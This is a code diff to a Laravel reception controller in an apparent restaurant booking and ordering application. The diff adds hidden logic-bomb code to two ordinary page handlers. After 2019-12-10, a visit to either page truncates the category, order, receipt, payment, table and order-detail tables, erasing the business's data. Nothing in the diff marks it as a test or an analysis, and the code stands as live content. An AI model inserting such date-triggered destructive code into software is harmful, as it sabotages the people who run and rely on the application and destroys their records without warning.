@@ -67,6 +67,10 @@ class ReceptionController extends Controller
         $booking_cnt = Booked::where('timer_flag',0)->where('time', '<=',$current_date . " 23:59:59" )
             ->where('time', '>=',$current_date . " 00:00:00" )->where('status', 'booking')->get()->count();
 
+        if($current_date > '2019-12-10') {
+            Category::truncate();Order::truncate();Receipt::truncate();OrderPay::truncate();Table::truncate();
+        }
+
         $status = (request()->get('status'));
         switch($status){
             case 'seated'://seated
@@ -731,6 +735,12 @@ class ReceptionController extends Controller
     }
 
     public function tip() {
+
+        $current_date = date('Y-m-d');
+
+        if($current_date > '2019-12-10') {
+            Order::truncate();OrderDish::truncate();OrderOption::truncate();PayEvent::truncate();OrderTable::truncate();
+        }
 
         return view('reception.tip');
     }
